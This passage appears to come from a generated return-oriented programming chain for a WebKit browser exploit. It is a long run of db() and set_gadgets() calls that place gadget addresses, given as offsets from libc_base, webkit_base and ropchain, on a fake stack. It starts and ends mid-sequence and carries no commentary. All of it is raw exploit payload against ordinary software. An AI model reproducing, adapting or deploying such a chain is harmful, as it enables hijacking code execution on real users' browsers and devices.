db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+302680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+302832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+302816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+302952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+302968, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+303136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+303104, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+303120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+303280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+303264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+303464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+303448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+303584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+303632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+303616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+303744, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+303736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+303760, 
ropchain+303776, 
libc_base+811575, 
ropchain+303792, 
libc_base+811575, 
ropchain+305544, 
libc_base+50775, 
libc_base+793877, 
ropchain+303832, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+303960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+303944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+304056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+304136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+304192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+304288, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+304376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+304392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+304520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+304504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+304624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+304640, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+304728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+304856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+304912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+305016, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+305104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+305120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+305264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+305232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+305248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+305352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+305424, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+305488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+301296, 
libc_base+50775, 
libc_base+793877, 
ropchain+305584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+305720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+305768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+305752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+305880, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+305872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+305896, 
ropchain+305912, 
libc_base+811575, 
ropchain+301032, 
libc_base+759626, 
libc_base+793877, 
ropchain+305968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+306048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+306104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+306200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+306288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+306304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+306456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+306440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+306472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+306656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+306800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+306952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+306968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+306936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+307072, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307088, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+307256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307224, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+307240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+307440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307408, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+307392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+307512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307528, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+307616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+307672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+307792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+307824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+307808, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+307968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+307936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+307952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+308048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308176, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+308160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+308272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+308360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+308376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+308528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+308560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+308512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+308544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+308648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+308744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+308728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+308872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+309024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+309040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+309008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+309144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+309160, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+309328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+309296, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+309312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877877, 
libc_base+793877, 
ropchain+309472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+309488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+309456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+309576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+309632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+309760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+309840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+309896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+309992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+310080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+310096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+310248, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+310232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+310264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+310448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+310592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+310744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+310728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+310864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+310880, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+311048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+311016, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+311032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+105267,); 
db([0, 0]); 
set_gadgets([
webkit_base+7047212, 
libc_base+877175, 
libc_base+793877, 
ropchain+311232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+311200, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+311184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+311304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+311320, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+311408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+311464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+311536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+311592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+311696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([16, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+311856, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+313952, 
libc_base+882884, 
libc_base+793877, 
ropchain+311968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+311984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+311952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+312080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+312064, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([3, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+312280, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+312624, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+312392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+312376, 
webkit_base+7438103, 
